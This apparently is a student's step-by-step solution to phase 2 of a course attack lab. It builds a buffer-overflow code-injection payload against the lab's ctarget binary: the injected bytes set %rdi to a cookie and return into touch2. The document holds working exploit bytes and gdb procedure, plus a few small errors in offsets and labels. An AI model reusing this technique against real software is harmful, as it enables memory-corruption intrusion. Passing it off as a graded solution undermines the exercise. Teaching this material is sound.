// Phase 2 //

phase 2 is going to execute a text file as well, except this time we will also pass a string in the text file.

In your other window with the ctarget dump, look at the <touch2> function. 
Looks something like this:
    000000000040178c <touch2>:
      40178c:	48 83 ec 08          	sub    $0x8,%rsp
      401790:	89 fe                	mov    %edi,%esi
      401792:	c7 05 e0 30 20 00 02 	movl   $0x2,0x2030e0(%rip)        # 60487c <vlevel>
      401799:	00 00 00 
      40179c:	3b 3d e2 30 20 00    	cmp    0x2030e2(%rip),%edi        # 604884 <cookie>
      4017a2:	75 1b                	jne    4017bf <touch2+0x33>
      4017a4:	bf a0 30 40 00       	mov    $0x4030a0,%edi
      4017a9:	b8 00 00 00 00       	mov    $0x0,%eax
      4017ae:	e8 8d f4 ff ff       	callq  400c40 <printf@plt>
      4017b3:	bf 02 00 00 00       	mov    $0x2,%edi
      4017b8:	e8 dc 04 00 00       	callq  401c99 <validate>
      4017bd:	eb 19                	jmp    4017d8 <touch2+0x4c>
      4017bf:	bf c8 30 40 00       	mov    $0x4030c8,%edi
      4017c4:	b8 00 00 00 00       	mov    $0x0,%eax
      4017c9:	e8 72 f4 ff ff       	callq  400c40 <printf@plt>
      4017ce:	bf 02 00 00 00       	mov    $0x2,%edi
      4017d3:	e8 73 05 00 00       	callq  401d4b <fail>
      4017d8:	bf 00 00 00 00       	mov    $0x0,%edi
      4017dd:	e8 ce f5 ff ff       	callq  400db0 <exit@plt>
      
Recall the pdf says the first argument to a function is passed in register %rdi.
Therefore we are going to modify %rdi register and store our unique cookie there.

in the other window, not the disamembled text window, create a file:
    >>> emacs phase2.s
in the file,we are going to write 2 lines of assembly code to replace the cookie with yours:
    movq $0x434b4b70,%rdi   ///write your cookie here after the $0x
    retq

then, compile this with gcc and then disassemble it to get the byte representation of your code:
    >>>  gcc -c phase2.s
    >>>  objdump -d phase2.o  > phase2.d
Open the phase2.d file:
    >>>  cat phase2.d
Will look like this: 
        Disassembly of section .text:

        0000000000000000 <.text>:
           0:	48 c7 c7 70 4b 4b 43 	mov    $0x434b4b70,%rdi
           c:	c3                   	retq   
           
The byte representation of the code is 48 c7 c7 70 4b 4b 43. Yours will be different but keep that open.


Now we need to find the address of the rsp register.
in a third window, log in again, go to attacklab directory, and type this:
    >>> gdb ctarget
    >>> break getbuf
    >>> run
    >>> disas

youll get something like this:
   0x000000000040182c <+0>:	  sub    $0x18,%rsp
   0x0000000000401830 <+4>:	  mov    %rsp,%rdi
   0x0000000000401833 <+7>:	  callq  0x401ab6 <Gets>
=> 0x0000000000401838 <+12>:	mov    $0x1,%eax
   0x000000000040183d <+17>:	add    $0x18,%rsp
   0x0000000000401841 <+21>:	retq   

Get to the instruction just below callq, which is the second mov, by typing this
   >>> until *0x401838  (plug your memory address in there)

Then it will ask you type a string...type a string longer than the buffer(24 characters in this case)
  >>> x/s %rsp
You will get something like:
    (gdb) x/s $rsp
    0x55620cd8:	"ldsjfsdkfjdslfkjsdlkfjsdlkfjsldkfjsldkjf" // the random string I typed

The address on the left side is what we want, 0x55620cd8


Now, create a text file named phase2.txt which will look something like below. only type the bytes not comments.
don't forget the bytes for your cookie, rsp, and touch2 go in reverse
(my cookie: 434b4b70) yours will begin with 48 c7 c7 and end with c3. put your cookie in between that:

    48 c7 c7 70 4b 4b 43 c3 /*this sets your cookie*/
    00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
    00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
    d8 0c 62 55 00 00 00 00 /* address of register %rsp */
    8c 17 40 00 00 00 00 00 /*address of touch2 function */
